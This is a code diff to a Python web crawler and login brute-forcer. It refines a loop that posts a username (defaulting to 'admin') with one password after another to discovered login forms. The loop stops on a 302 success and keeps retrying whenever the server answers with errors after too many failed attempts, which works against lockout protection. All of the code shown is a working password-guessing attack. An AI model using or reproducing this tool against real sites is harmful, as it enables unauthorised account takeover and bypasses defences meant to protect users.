@@ -164,31 +164,34 @@ def brute_force(user, keywords, forms, user_agent):
         get_header = {'User-Agent': user_agent}
         html_doc = get_request(form, get_header)
         parser = HTMLParser(html_doc)
+        done = False
 
         for password in passwords:
-            login = parser.create_login_string(user, password)
-            post = {'User-Agent': user_agent,
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Content-Length': str(len(login))}
+            if not done:
+                login = parser.create_login_string(user, password)
+                post = {'User-Agent': user_agent,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Content-Length': str(len(login))}
 
-            response = post_request(form, post, login)
-            
-            if get_status(response) >= 500:
-                print('\nHold on, too many failed attempts! Waiting for the server to accept more login requests...\n')
-            
-            # Continually retry logging in if there is a server error (too many failed attempts)
-            while get_status(response) >= 500:
                 response = post_request(form, post, login)
+                
+                if get_status(response) >= 500:
+                    print('\nHold on, too many failed attempts! Waiting for the server to accept more login requests...\n')
+                
+                # Continually retry logging in if there is a server error (too many failed attempts)
+                while get_status(response) >= 500:
+                    response = post_request(form, post, login)
 
-            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
+                print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
 
-            if get_status(response) == 302:
-                print('Login Succeeded!\n')
-                break
-            else:
-                print('Login Failed...\n')
+                if get_status(response) == 302:
+                    print('Login Succeeded!\n')
+                    done = True
+                else:
+                    print('Login Failed...\n')
         
-        print('Ran out of passwords! Bruteforce failed!')
+        if not done:
+            print('Ran out of passwords! Bruteforce failed!')
           
 def main():
     parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
@@ -203,7 +206,7 @@ def main():
     modes = [['bfs'], ['dfs']]
 
     url = reformat_url(args.url.pop())
-    username = 'admin' if args.username is None else args.username
+    username = 'admin' if args.username is None else args.username.pop()
     max_depth = 10 if args.maxdepth is None else args.maxdepth.pop()
     max_pages = 10 if args.maxpages is None else args.maxpages.pop()
     mode = args.mode.pop() if args.mode in modes else 'bfs'
@@ -234,7 +237,6 @@ def main():
         crawl_subdomains(False, url, header_dict, page_counter)
     
     brute_force(username, keywords, forms, user_agent)
-    print('\n\n\n', get_subdomains(url))
 
 if __name__ == '__main__':
     main()
